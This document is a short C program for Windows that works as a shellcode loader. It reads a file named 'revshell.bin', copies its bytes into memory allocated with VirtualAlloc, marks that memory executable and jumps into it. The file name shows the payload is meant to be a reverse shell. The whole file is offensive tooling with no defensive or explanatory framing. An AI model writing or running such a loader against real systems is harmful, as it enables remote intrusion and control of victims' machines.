#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main() {
    FILE *file;
    unsigned char *buffer;
    size_t fileSize;
    DWORD oldProtect;

    // Open the shellcode file
    file = fopen("revshell.bin", "rb");
    if (file == NULL) {
        printf("Error: Could not open loader.bin\n");
        return 1;
    }

    // Get the file size
    fseek(file, 0, SEEK_END);
    fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory to hold the shellcode
    buffer = (unsigned char *)malloc(fileSize);
    if (buffer == NULL) {
        printf("Error: Could not allocate memory\n");
        fclose(file);
        return 1;
    }

    // Read the shellcode into the buffer
    fread(buffer, 1, fileSize, file);
    fclose(file);

    // Allocate executable memory
    void *exec_mem = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("Error: VirtualAlloc failed\n");
        free(buffer);
        return 1;
    }

    // Copy shellcode to the allocated memory
    memcpy(exec_mem, buffer, fileSize);

    // Change memory protection to execute-only
    if (!VirtualProtect(exec_mem, fileSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Error: VirtualProtect failed\n");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        free(buffer);
        return 1;
    }

    printf("Executing shellcode...\n");

    // Execute the shellcode
    ((void(*)())exec_mem)();

    printf("Shellcode executed\n");

    // Cleanup
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    free(buffer);

    return 0;
}
